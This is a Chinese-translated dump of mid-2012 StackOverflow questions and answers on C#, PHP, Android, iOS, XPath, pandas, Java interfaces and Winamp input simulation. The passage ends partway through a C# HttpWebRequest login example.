# StackOverflow 问答 11651000-11651999

# c# - 无法从 Web.Config 读取 appSettings 值

> ID：11651005
> 
> 赞同：6
> 
> 时间：2012-07-25T13:36:35.647
> 
> 标签：c#, web-config

我的 web.config 中有以下内容：

```
<configuration>
    <appSettings>
        <add key="PsychMon" value="true"/>
    </appSettings>
 . . .
</configuration> 
```

我的代码隐藏中有以下代码：

```
 System.Configuration.Configuration webConfig = 
System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration(null) ; 
```

但是，当我查看 webConfig 时， webConfig.AppSettings.Settings.Count = 0 。

为什么不读取应用程序设置？

我想要做的是能够通过使用获得设置：

```
 System.Configuration.KeyValueConfigurationElement psych = 
webConfig.AppSettings.Settings["PsychMon"]; 
```

我正在使用 c# 3.5，与 2008 相比

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-25T13:39:50.247

你为什么不写这个？

```
string value = 
    System.Web.Configuration.WebConfigurationManager.AppSettings["PsychMon"]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T13:39:14.700

尝试这个 ：

```
ConfigurationManager.AppSettings["PsychMon"]; 
```

或（对于全局）

```
 Configuration webConfig = WebConfigurationManager.OpenWebConfiguration(Request.ApplicationPath); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T13:40:52.277

与其创建`webConfig`变量，不如直接使用`ConfigurationManager.AppSettings["PsychMon"]`

# google-chrome-extension - 如何开发访问 google drive 的 chrome 扩展程序？

> ID：11651014
> 
> 赞同：2
> 
> 时间：2012-07-25T13:36:55.810
> 
> 标签：google-chrome-extension, google-drive-api

是否有访问驱动器的 chrome 扩展的示例？

使用[chrome_ex_oauth.js](http://src.chromium.org/viewvc/chrome/trunk/src/chrome/common/extensions/docs/examples/extensions/oauth_contacts/chrome_ex_oauth.js?content-type=text/plain)：

它与文档列表范围 ( ) 共舞`https://docs.google.com/feeds/`，但`https://www.googleapis.com/auth/drive`范围似乎不起作用。我尝试过更改消费者密钥/秘密等：

```
oauth =  ChromeExOAuth.initBackgroundPage({
  'request_url': 'https://www.google.com/accounts/OAuthGetRequestToken',
  'authorize_url': 'https://www.google.com/accounts/OAuthAuthorizeToken',
  'access_url': 'https://www.google.com/accounts/OAuthGetAccessToken',
  'consumer_key': 'anonymous',
  'consumer_secret': 'anonymous',
  'scope':'https://www.googleapis.com/auth/drive',
  'app_name': 'Chrome Extension'
});

oauth.authorize(onAuthorizeCallback); 
```

如果你能让我通过 oauth，我相信我能处理剩下的事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T00:51:03.170

据我了解，在此之前有先决条件。看到这个：[https](https://developers.google.com/drive/get-started#create_a_new_file_from_the_drive_ui) ://developers.google.com/drive/get-started#create_a_new_file_from_the_drive_ui ，更具体地说[这个](https://developers.google.com/drive/register)和[这个](https://developers.google.com/drive/listing)。

# php - 在php中显示第n级类别

> ID：11651017
> 
> 赞同：0
> 
> 时间：2012-07-25T13:37:18.600
> 
> 标签：php

下面是我的 SQL 表

```
id   parent_id

1      0
2      0
3      1
4      1
5      3
6      5 
```

我想在数组中显示第 n 级层次关系，如下所示

```
array
{
  1
    sub{
         3
           sub{
               5
           }
         4
        }
 } 
```

等等

我怎么能在 PHP 中做到这一点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:48:53.457

首先选择父 id 为 0 的所有根类别，并将它们的 id 传递给这个递归函数

```
function getChildCats($catId)
{
    $sql = "select * from categories where parent_id = $cateID";
    $res = mysql_query($sql);
    $raws[];  
    while($raw = mysql_fetch_assoc($res))
    {
        $raw['sub'] =  getChildCats($raw['id'])
        $raws[] = $raw;
    }
    return $raws;
} 
```

# objective-c - 以编程方式滚动 UIScrollView 时显示指示器

> ID：11651018
> 
> 赞同：5
> 
> 时间：2012-07-25T13:37:18.943
> 
> 标签：objective-c, ipad, ios5, uiscrollview, drag-and-drop

我正在编写一个框架来简化 iOS 中的常见（但有时很棘手）拖放任务。作为该框架的一部分，当用户在滚动视图边缘附近拖动（并短暂保持）一个对象时，它将以编程方式沿边缘方向滚动滚动视图。

我可以使用 -setContentOffset:animated:(passing NO to animated) 和 NSTimer 很好地滚动，但滚动指示器不显示。这会导致令人困惑的用户体验（如果背景是纯色/无纹理的，则很难判断它正在滚动）。

我曾尝试从我的 NSTimer 回调中调用 -flashScrollIndicators（因为设置了 contentOffset），但由于某种原因，指示器会等到滚动完成后才会闪烁。

我想要的效果是让指示器在滚动发生时出现，然后在滚动停止后消失。基本上，我希望与用户用手指滚动滚动视图时的效果相同，以触发由拖动引起的我的程序滚动。

关于如何实现这一目标的任何想法？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-09-15T10:10:02.957

我认为你可以通过一些动画编程来做到这一点。

# android - 完成从 url 下载图像后如何启动意图？

> ID：11651025
> 
> 赞同：0
> 
> 时间：2012-07-25T13:37:34.393
> 
> 标签：android, android-intent, android-image, android-internet, android-handler

我需要在完成从 url 下载图像后开始我的意图，而不需要应用程序本身的用户采取任何行动。

这是我的活动，它首先会下载图像，然后会启动意图。

```
 //download image then start decod intent
public  void download(View v)
{
   //first download image 
    new MyAsnyc().execute();

      //then start this intent
      final Handler handler=new Handler();
     final Runnable r = new Runnable()
     {
         public void run() 
         {
             { 
                 Intent intent1 = new Intent(Test_PROJECTActivity.this, DecodeActivity.class);
                File path = Environment
                        .getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
                File file = new File(path, "DemoPictureX.png");
                Log.d("file", file.getAbsolutePath());
                intent1.putExtra("file", file.getAbsolutePath());
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                startActivity(intent1);
                }
         }
     };
 handler.postDelayed(r, 5000);
  } 
```

MyAsnyc 做得很好并且可以正确下载图像，但是代码的第二部分在下载图像时启动了意图，因此图像将被损坏，从而导致异常。

一旦图像准备好并完成下载，如何使意图开始？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:41:10.013

我认为您应该使用具有**onPostExecute**、**onPreExecute**等功能的**AsyncTask**。您可以在下载前后轻松控制内容。

 ***** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:06:12.333

```
 public class YourClassName extends AsyncTask<String, Void, String > {

       protected void onPreExecute() { }

       protected String doInBackground(String... params) {}

       protected void onPostExecute(String result) {}
} 
```

在方法中完成所有下载内容并从方法`doInBackground`开始一个新的，如下所示：`Intent``onPostExecute`

```
Intent i = new Intent(ClassName.this, TheClassToStart.class);
context.startActivity(i); 
```

如果您想将图像放入新活动中，请执行以下操作：

```
i.putExtras(...) 
```

希望这有帮助！

**关于没有封闭实例的问题**

如果您从另一个活动启动 AsyncTask，请将此活动传递`context`给`AsyncTask`类。

```
public class YourClassName extends AsyncTask<String, Void, String > {
    Context mContext;

    public YourClassName(Context mContext) {
      this.mContext = mContext;
    }

    //other methods
} 
```

从你的第一个`Activity`，调用以`AsyncTask`这种方式扩展的类：

```
new YourClassName(getApplicationContext()).execute(""); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:41:27.410

您应该将`Intent`起始代码放在`AsyncTask`'s`onPostExecute()`方法中。这将确保代码在正确的时间执行，并使异常处理更容易。希望这可以帮助。****

# c++ - 最小包围矩形？

> ID：11651027
> 
> 赞同：0
> 
> 时间：2012-07-25T13:37:45.783
> 
> 标签：c++, math, opencv, geometry

我想使用opencv计算边界矩形（窗口）的最小封闭圆？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:51:35.467

我会使用[minEnclosureCircle](http://opencv.itseez.com/modules/imgproc/doc/structural_analysis_and_shape_descriptors.html?highlight=minenclosingcircle#minenclosingcircle)传入矩形的四个点。

再想一想，对于一个普通的矩形（Rect struct）来说，它可以很容易地计算出来。

圆的中心（包括封闭和内部）只是（x + width / 2, y + height / 2）。封闭圆的半径是从中心到角之一的距离（阅读：毕达哥拉斯）。内圆的半径就是 min(width, height)/2。

注意：对于不是正方形的矩形，有无限数量的内圆。我的方法只是最多使用中心。

# iphone - 如何从一个视图控制器为另一个视图控制器中的 NSString 设置值

> ID：11651033
> 
> 赞同：0
> 
> 时间：2012-07-25T13:37:52.297
> 
> 标签：iphone, objective-c, uistoryboard, ios5.1

我正在使用 Xcode 4.3.2 和 iOS 5.1 模拟器，在我的项目中我使用了两个视图控制器：testingViewController 和 detailView。一旦我在 testingViewController 中选择了 tableViewCell，我想在 detailView 中设置 NSString 的值。

为此，我使用了以下代码：

> testingViewController.h

![testingViewController.h](../Images/90d808f2af6fb0242d56024ffb6a6a2e.png)

> testingViewController.m

![testingViewController.m](../Images/f475a584f31134b780a56cc995b1c96d.png)

> 详细视图.h

![详细视图.h](../Images/5928c057360ef8a60811d9e8a01fd10a.png)

> 详细视图.m

![详细视图.m](../Images/aa32da9a3d2912d4a109dc2a7ad46175.png)

`wordName`我在控制台和控制台中都得到了空值`wordMeaning`。

有人有解决方案吗？提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T13:58:57.293

`testingViewController`如果你在and之间有故事板segue `detailView`，在你`testingViewController`的`prepareForSegue:`方法中你应该改变线

```
detailView *dVw = [[detailView alloc] init]; 
```

到

```
detailView *dVw = (detailView *)segue.destinationViewController; 
```

另外，我建议您在`detailView.h`文件中更改

```
@property (nonatomic, assign) NSString *YOUR_STRING; 
```

到

```
@property (nonatomic, copy) NSString *YOUR_STRING; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T13:58:42.263

采用

```
[[segue destinationViewController] setWordMeaning:meaningString];
[[segue destinationViewController] setWordName:wordTapped]; 
```

问题是您正在创建`detailView`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:01:14.453

我写[这个](http://pastebin.com/mNes8SmE)是为了在类之间共享数据。我希望它对你有用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T13:59:58.930

将您的 NSStrings 设置为保留属性，而不是分配。此外，当您更改它们的值时，请始终使用

```
self.property = ...; 
```

为了保留发生。否则，它将被释放，您将获得无效或错误的访问权限。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-25T14:01:00.437

创建自定义初始化方法

```
declare in .h file 

    -(id)initWithWordName:(NSString*)myWordName andWordMeaning:(NSString*)myWordMeaning;

    and in .m file

    -(id)initWithWordName:(NSString*)myWordName andWordMeaning:(NSString*)myWordMeaning
    {
       self = [super init];
       if(self)
       {
         self.wordName = myWordName;
         self.wordMeaning = myWordMeaning;
       }
       return self;
    } 
```

并且 NSString 属性应该是复制而不是分配，请在您的 detail.h 文件中进行更改

# ruby - 测试 ruby watir 脚本中的错误

> ID：11651036
> 
> 赞同：1
> 
> 时间：2012-07-25T13:38:09.670
> 
> 标签：ruby, watir, watir-webdriver

我有几个 ruby​​ watir-webdriver 脚本，用于自动从各种网站下载文件。登录到站点、填写文本字段、单击按钮的简单脚本......我必须做什么才能让脚本在出现错误或超时时发送电子邮件警报？脚本在 Mac OSX 服务器上运行，我可以使用 /usr/bin/mail。

如果脚本在脚本的最后一行之前停止，只是希望得到一个简单的错误消息：

```
b.close 
```

感谢您所有的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:50:35.420

这并不优雅，但最简单的方法是使用 begin/rescue/end 块。

```
begin
   <actionable code here>
rescue => e
   puts "Error: #{e}"
end

b.close 
```

您可以将“puts”部分更新为通过电子邮件发送或将错误写入文本文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T17:15:23.783

如果您需要发送邮件，我会建议使用[mail gem 。](https://rubygems.org/gems/mail)

# python - 需要帮助编写 xpath 字符串以匹配多个（但不是全部）表格单元格

> ID：11651037
> 
> 赞同：0
> 
> 时间：2012-07-25T13:38:19.487
> 
> 标签：python, xpath, screen-scraping, web-scraping, minidom

注意：由于给出了一些早期答案，因此该问题已更新。这仍然是同一个问题，只是希望更清楚。

我正在尝试让站点抓取工具正常工作，但在为某些表格单元格提供合适的 xpath 字符串时遇到了问题。

```
<tbody>
  <tr>
    <td class="Label" width="20%" valign="top">Uninteresting section</td>
    <td class="Data"> I don't care about this</td>
  </tr>
  <tr>
    <td></td>
    <td class="Data"> I don't care about this</td>
  </tr>
  <tr>
    <td class="Label" width="20%" valign="top">Interesting section</td>
    <td class="Data"> I want this-1</td>
  </tr>
  <tr>
    <td></td>
    <td class="Data"> I want this-2</td>
  </tr>
  <tr>
    <td></td>
    <td class="Data"> I want this-n</td>
  </tr>
  <tr>
    <td class="Label" width="20%" valign="top">Uninteresting section</td>
    <td class="Data"> I don't care about this</td>
  </tr>
  <tr>
    <td></td>
    <td class="Data"> I don't care about this</td>
  </tr>
</tbody> 
```

我想要有趣部分中所有数据字段的内容。这些可以有任意数量。我不关心代码中的其他任何内容，但我需要所有这些。

在上面的例子中： 我想要 this-1 我想要 this-2 我想要 this-n

如果相关，我将 xml.dom.minidom 和 py-dom-xpath 与 Python 2.7 一起使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T18:33:17.477

您可以在该部分（包括其他部分）之后获得所有 n tds

```
 //tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class = "Data"]/text() 
```

然后你可以得到你不想要的下一部分的所有 m tds

```
//tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class="Label"][1]/following::td[@class = "Data"]/text() 
```

然后你可以在 Python 中使用第一个 n - m tds。

您可以尝试在 XPath 中使用 position 和 count 函数做同样的事情：

```
 //tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class = "Data"][position() <= (count(//tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class = "Data"]/text())  - count(//tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class="Label"][1]/following::td[@class = "Data"]/text()) )]/text() 
```

如果你有 XPath 2.0，你可以优雅地使用`except`操作符：

```
 //tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class = "Data"]/text() except  //tr[@class="Entry"]//tr/td[contains(text(), "Section title")]/following::td[@class="Label"][1]/following::td[@class = "Data"]/text() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:13:36.953

```
//tr[@class="Entry"]/td[@class="Data"]/text() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T15:37:37.273

```
//tbody[tr/td[contains(text(),"Section title")]]/tr/td[@class="Data"]/text() 
```

更新。这是做什么的：

1.  获取`tbody`包含*“部分标题”*`tr`的`td`内容

**   从那些得到每个`td`带有 c的文本`lass="Data"`*

# iphone - 自定义 UIView 绘图工件

> ID：11651044
> 
> 赞同：0
> 
> 时间：2012-07-25T13:38:31.467
> 
> 标签：iphone, ios, uiview, custom-controls

我有以下问题：

我制作了两个自定义 UIView。第一个是用作容器的气泡视图，它使用带有 CGContext 方法的 drawRect 来绘制自身。第二个是文本视图，它是 UILabel 的子类，用于显示 NSAttributedStrings（需要 iOS 5）。这个文本视图使用了 UILabel drawTextInRect: 的指定子类方法。

使用 addSubview 将文本视图添加到气泡视图中。他们都使用透明的 UIColor (clearColor) 作为背景。现在为了性能优化，我想将以前的清晰背景颜色设置为白色。

突然间出现了可见的视觉伪影。为了更好地调试，我现在将背景颜色设置为红色和蓝色：

![问题](../Images/f09d4551160d391b2cf02643e473321b.png)

如您所见，有一个红色矩形“Lorem”，一个蓝色矩形“Lorem ipsum 等”。和一个绿色矩形“ipsum dolor”，它们都很好。它们是我的文本视图的当前位置和大小 - 红色“Lorem”下方有一个蓝色和红色矩形。它们是视觉工件。当我用 initFrame 初始化我的自定义文本视图时，它们正好在*起始矩形上。*

我确实使用 setFrame: 将标签的框架移动到了正确的位置。*仍然*绘制以前的标签矩形，但为什么呢？[self setNeedsDisplay] 和 [self setNeedsLayout] 都没有效果。

重绘的原因是什么，我该如何解决？

# c# - 实体框架 4 图像类型

> ID：11651046
> 
> 赞同：0
> 
> 时间：2012-07-25T13:38:32.383
> 
> 标签：c#, .net, entity-framework, sql-server-ce

我在 SQL Server CE 4 中使用 Entity Framework 4 代码优先。

我应该在课堂上定义什么类型？SQL Server CE 仅支持`Image`.

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:44:05.880

你应该`byte[]`在你的课堂上使用。

“图像”数据库类型有点误导，因为它只表示任意二进制数据（完整的 SQL Server 已弃用它以支持该`varbinary(max)`类型）

* * *

在您的上下文类中，您可以尝试：

```
modelBuilder.Entity<YourClass>().Property(x => x.YourProperty)
            .HasColumnType("image").IsMaxLength(); 
```

（我没有任何SQLCE项目可以尝试；也许它会起作用，也许不会，也许只有一种配置方法就足够了）

# python - Pandas：旋转数据框

> ID：11651048
> 
> 赞同：3
> 
> 时间：2012-07-25T13:38:37.593
> 
> 标签：python, pandas

提前为超级新手的问题道歉。

我正在学习使用熊猫，并且有一个我不知道如何执行的简单操作：

我有以下数据框：

```
print df 
Out[19]: 
USERNAME  REQUEST_TYPE   STATUS  LATENCY
0      foo             1  SUCCESS        7
1      foo             2  SUCCESS       17
2      bar             1  SUCCESS       10
3      bar             2  FAILURE       12 
```

我想为每个 USERNAME 保留一行，这是每个 REQUEST_TYPE 的 STATUS 和 LATENCY 列的串联。输出应如下所示：

```
USERNAME    STATUS_1  LATENCY_1     STATUS_2    LATENCY_2
0      foo  SUCCESS     7           SUCCESS        17
1      bar  SUCCESS     10          FAILURE        12 
```

我想到了以 pandas.groupby(df,['USERNAME', 'REQUEST_TYPE']) 开头的东西，但我不确定如何将行连接回来，以及是否有任何方法可以创建新的列名。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T13:43:57.490

```
b = df.pivot('USERNAME', 'REQUEST_TYPE')
b.columns = ['{0}_{1}'.format(*col) for col in b.columns] 
```

`b`就是现在：

```
 LATENCY_1 LATENCY_2 STATUS_1 STATUS_2
USERNAME                                      
bar             10        12  SUCCESS  FAILURE
foo              7        17  SUCCESS  SUCCESS 
```

# java - 什么是更好的做法，通过扩展组合两个接口，或者将接口转换为其实现类型？

> ID：11651049
> 
> 赞同：2
> 
> 时间：2012-07-25T13:38:38.920
> 
> 标签：java, design-patterns, interface

假设我有两个接口和一个行为类：

```
public interface Creable {
    public boolean belongsToSystem();
    public List<Creable> getCreatedItems();
}

public interface HasDependencies {
    public void createDependencies();
    public void generateDependents();
}

public class CreableBehavior {
    private Creable creableObject;
    public CreableBehavior(Creable creableObject) {
         this.creableObject = creableObject;
    }

    public boolean hasBeenCreated() {
        return !creableObject.belongsToSystem() && !creableObject.getCreatedItems().contains(createdObject);
    } 
```

而这段代码：

```
Creable includedTab = new AdempiereTab(getIncluded_Tab_ID(),
                creableElements);
if (!new CreableBehavior(includedTab).hasBeenCreated) {
    includedTab.createDependencies();
    includedTab.getCreatedItems().add(includedTab);
    includedTab.generateDependents();
} 
```

AdempiereTab 实现了 Creable 和 HasDependencies。问题是我需要同时使用接口 Creable 和 HasDependencies。
我应该这样投射：

```
if (!new CreableBehavior(includedTab).hasBeenCreated) {
    ((AdempiereTab)includedTab).createDependencies();
    includedTab.getCreatedItems().add(includedTab);
    ((AdempiereTab)includedTab).generateDependents();
} 
```

或者我应该创建一个新的接口 CreableWithDependencies 来扩展这两个接口并使用那个接口吗？

谢谢。

编辑：回答，我应该扩展接口，因为我不想依赖于实现类型。将它们结合起来可以让我使用具有相同代码的多种类型。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T13:53:37.463

仅基于查看创建 AdempiereTab 的代码片段，我的第一个想法是，您可以简单地将其变量类型声明为 AdempierTab 而不是 Creable。您不需要使用抽象类型 Creable，因为您已经知道这是您将在其上执行接口方法的类型。

第二个想法，即使您知道 Creable 是 AdempiereTab（来自前面的代码行），最好在强制转换之前检查使用 instanceof 以避免任何异常。这证实了您应该将“includedTab”声明为 AdempiereTab。

然而，在不了解应用程序的太多上下文的情况下，我确实对 HasDependencies 接口提出了质疑。纯粹基于名称，它本身似乎更像是一种方法。但它暴露的行为似乎令人困惑：create 和 generate 都返回 void。对我来说，这只是引出了这个界面是否经过深思熟虑的问题，也许需要重新设计成更清晰的东西。这可能会帮助您避免现在面临的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T13:49:39.653

有两种设计力量在起作用：**使您的界面尽可能小，并尽量减少界面的数量**。一般来说，大型接口以后重构的问题更大。

如果您的接口已经在整个系统中使用，您可以将客户端代码拆分为单独的方法或类，创建一个`CreableHasDependencies`扩展两个接口的接口，或者直接使用类类型。

如果这是您第一次使用接口，则将它们组合起来，因为接口属于客户端代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:44:24.863

或者你可以做这样的事情：

```
AdempiereTab includedTab = new AdempiereTab(getIncluded_Tab_ID(),
                creableElements);
if (!new CreableBehavior(includedTab).hasBeenCreated) {
    includedTab.createDependencies();
    creableElements.getCreatedItems.add(includedTab);
    includedTab.generateDependents();
} 
```

由于`AdempiereTab`实现了这两个接口，您可以将其传递`AdempiereTab`给`CreableBehavior's`构造函数。

# c# - 发送鼠标点击到winamp

> ID：11651051
> 
> 赞同：0
> 
> 时间：2012-07-25T13:38:46.490
> 
> 标签：c#, winapi, winamp

我正在尝试使用 win api 学习鼠标/键盘仿真。
我发现可以使用 sendmessage() 函数模拟按钮单击。

好吧，我得到了“播放”按钮的坐标（它是 (60;100)）并尝试使用以下代码按下此按钮：

```
 int x = 60;
            int y = 100;
            int lParam = ((x << 16) | (y & 0xffff));

            int parentWindow = FindWindow("BaseWindow_RootWnd", "Main Window");//get main winamp window
            MessageBox.Show(parentWindow.ToString());//failed if 0

            SendMessage(parentWindow, WM_LBUTTONDOWN, IntPtr.Zero, new IntPtr(lParam));//send left mouse button down
            SendMessage(parentWindow, WM_LBUTTONUP, IntPtr.Zero, new IntPtr(lParam));//send left mouse button up 
```

但是这段代码对winamp没有影响。

谁能指出我犯的错误？任何帮助是极大的赞赏！

ps 将鼠标移到winamp播放按钮，而不是单击，而不是向后移动，这不适用于我。
对于 winamp 来说，也无法获得按钮的句柄。使用按钮句柄 SendMessage() 可以很好地工作，但使用坐标则根本不行。

***补充 #1***

好吧，上面的代码激活了 winamp 窗口并显示它，如果它被最小化了。但是播放按钮仍然不想被按下;(

***补充 #2***

以下是我执行上述代码后收到的消息。

![spy++ 中的消息](../Images/a57312ffb443601103ad683f97801ec3.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:10:49.170

要让 Winamp 播放/暂停当前歌曲，只需向其发送一条播放/暂停消息，该消息的长度为 40046，如`winamp.h`. 您必须以`WM_WA_IPC`消息（即用户消息，也称为`WM_USER`）而不是`WM_LBUTTONDOWN`.

所以，这样的事情应该做：

```
SendMessage(parentWindow, WM_USER, IntPtr.Zero, new IntPtr(40046)); 
```

更多信息[在这里](http://forums.winamp.com/showthread.php?t=35586)，[这里](http://forums.winamp.com/showthread.php?t=302649)和[这里](http://www.koders.com/c/fid556E7D2B6434BB0911EFD08136492531E8FBED47.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-26T15:52:32.550

好吧，要在 winamp 窗口中模拟鼠标单击，您需要准确地使用硬件鼠标单击它时发生的事情。以下是从 spy++ 中发现的：
![在此处输入图像描述](../Images/6c1d40d7181a447df8edbfa479257813.png)

所以要模拟鼠标点击，我们需要：

1.  调用两次`PostMessage()`而不是`SendMessage()`因为上面屏幕截图中的**“P”**告诉我们消息是从 PostMessage() 获得的（根据[msdn](http://msdn.microsoft.com/en-us/library/dd470399)）
2.  第一个 PostMessage() 的参数应该如下：
    - 第一个参数 - Winamp 窗口句柄（在我们的例子中是`005E09FA`）
    - 第二个参数 - 鼠标左键按下时事件的 winapi 代码（`WM_LBUTTONDOWN = 0x201`）
    - 第三个参数 - `MK_LBUTTON = 0x1`（看来，有必要传一下，如果有人能解释一下就好了）
    - 第四个参数 - 你想按下鼠标按钮的点的坐标（这个参数可以计算如下 - `((Y << 16) | X)`）
3.  第二个 PostMessage() 的参数应该如下：
    - 第一个参数 - Winamp 窗口句柄（在我们的例子中是`005E09FA`）
    - 第二个参数 - 鼠标左键向上时事件的 winapi 代码（`WM_LBUTTONUP = 0x202`）
    - 第三个参数 -`0`或者`IntPtr.Zero`
    - 第四个参数 - 要释放鼠标按钮的点的坐标（如果要使单击生效，则需要与第一个 PostMessage() 相同；该参数可以计算如下 - `((Y << 16) | X)`）

感谢大家的意见！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:10:33.833

您应该使用[`SendInput()`](https://stackoverflow.com/search?q=%5Bc%23%5D+sendinput)将输入发送到其他应用程序，而不是伪造窗口消息。

# android - 安卓语音识别情感检测器

> ID：11651059
> 
> 赞同：1
> 
> 时间：2012-07-25T13:39:03.943
> 
> 标签：android, speech-recognition

我想在 android 中创建一个情感语音识别应用程序，它将通过获取用户的声音来检测用户的情感。是否可以在 android 中制作这种应用程序？如果可以，您能否给我链接以帮助我实现这一点。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T13:55:13.403

在任何软件应用程序中，您需要三样东西：

输入 --> 处理 --> 输出

因此，您必须将此项目分为以下三类：

1.  输入：录制语音数据
2.  PROCESSING：对录制的语音文件运行算法以进行情绪检测
3.  输出：在屏幕上写下情绪

实现第一很简单：[http ://www.benmccann.com/blog/android-audio-recording-tutorial/](http://www.benmccann.com/blog/android-audio-recording-tutorial/)

第二部分比较难，你需要做一些研究和阅读一些论文： http://www.google.co.za/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CGoQFjAA&url= [http %3A%2F%2Fcs229.stanford.edu%2Fproj2011%2FVeitZilberMordkovich-DetectingEmotionInHumanSpeech.pdf&ei=uvgPUMXRIcW3hQfA64DgAw&usg=AFQjCNEwLeC9R8jL-HOoBS6QWu-6dbRabQ](http://www.google.co.za/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CGoQFjAA&url=http%3A%2F%2Fcs229.stanford.edu%2Fproj2011%2FVeitZilberMordkovich-DetectingEmotionInHumanSpeech.pdf&ei=uvgPUMXRIcW3hQfA64DgAw&usg=AFQjCNEwLeC9R8jL-HOoBS6QWu-6dbRabQ)

[http://www.google.co.za/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0CGwQFjAB&url=http%3A%2F%2Fcs229.stanford.edu%2Fproj2007%2FShahHewlett%2520-%2520Emotion %2520Detection%2520from%2520Speech.pdf&ei=uvgPUMXRIcW3hQfA64DgAw&usg=AFQjCNFGwlKlcNyjG4uK4Hbmyy6emuYpIA](http://www.google.co.za/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0CGwQFjAB&url=http%3A%2F%2Fcs229.stanford.edu%2Fproj2007%2FShahHewlett%2520-%2520Emotion%2520Detection%2520from%2520Speech.pdf&ei=uvgPUMXRIcW3hQfA64DgAw&usg=AFQjCNFGwlKlcNyjG4uK4Hbmyy6emuYpIA)

第三部分是最简单的——作为练习留给你。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T12:31:51.427

您还可以对Google 语音识别引擎返回的*单词*进行非常简单的情绪检测。这并没有捕捉到说话的重点，但目前可能是更现实的方法。

# c# - 使用 Httpwebrequest 登录网站

> ID：11651063
> 
> 赞同：2
> 
> 时间：2012-07-25T13:39:12.360
> 
> 标签：c#, login, httpwebrequest

我是编程（C#）的新手，我开始为 MMORPG 编写一个机器人来学习以编程方式与网站通信等等......

我在这里和那里发现了很多关于这个话题的问题。最后在帮助的帮助下，我可以找到一些东西并完成它，不幸的是它不起作用:(

方法：

```
 public static CookieCollection GetCookie(HttpWebRequest request)
    {

        if (request.CookieContainer == null)
        { return new CookieContainer().GetCookies(request.RequestUri); }
        else
        { return request.CookieContainer.GetCookies(request.RequestUri); }
    }

    public static CookieContainer GetCookie(HttpWebResponse response)
    {

        CookieContainer cookiecontainer = new CookieContainer();
        cookiecontainer.Add(response.Cookies);

        return cookiecontainer;
    }

    public static void SetCookie(HttpWebRequest request, CookieContainer cookie)
    {
        request.CookieContainer = cookie;
    }

    public static void SetCookie(HttpWebResponse response, CookieCollection cookie)
    {
        response.Cookies = cookie;
    }

    public static HttpWebResponse PostData(string uri,string request,CookieContainer cookie)
    {
        HttpWebRequest httprequest;
        byte[] requestbytes;
        Stream requeststream;
        HttpWebResponse httpresponse;

        httprequest = (HttpWebRequest)HttpWebRequest.Create(uri);

        if (cookie == null)
        {httprequest.CookieContainer=new CookieContainer();}
        else
        {httprequest.CookieContainer=cookie;}

        httprequest.Method = "POST";
        httprequest.ContentType = "application/x-www-form-urlencoded";
        httprequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.142 Safari/535.19";
        requestbytes = ASCIIEncoding.ASCII.GetBytes(request);
        httprequest.ContentLength = requestbytes.Length;

        requeststream=httprequest.GetRequestStream();
        requeststream.Write(requestbytes,0,requestbytes.Length);
        requeststream.Close();

        httpresponse=(HttpWebResponse)httprequest.GetResponse();

        if (!(httpresponse.Cookies.Count>0))
        { SetCookie(httpresponse, GetCookie(httprequest)); }

        return httpresponse;
    }

    public static HttpWebResponse GetData(string uri, CookieContainer cookie)
    {
        HttpWebRequest httprequest;
        HttpWebResponse httpresponse;

        httprequest = (HttpWebRequest)HttpWebRequest.Create(uri);

        if (cookie == null)
        { httprequest.CookieContainer = new CookieContainer(); }
        else
        { httprequest.CookieContainer = cookie; }

        httprequest.Method = "GET";
        httprequest.ContentType = "application/x-www-form-urlencoded";
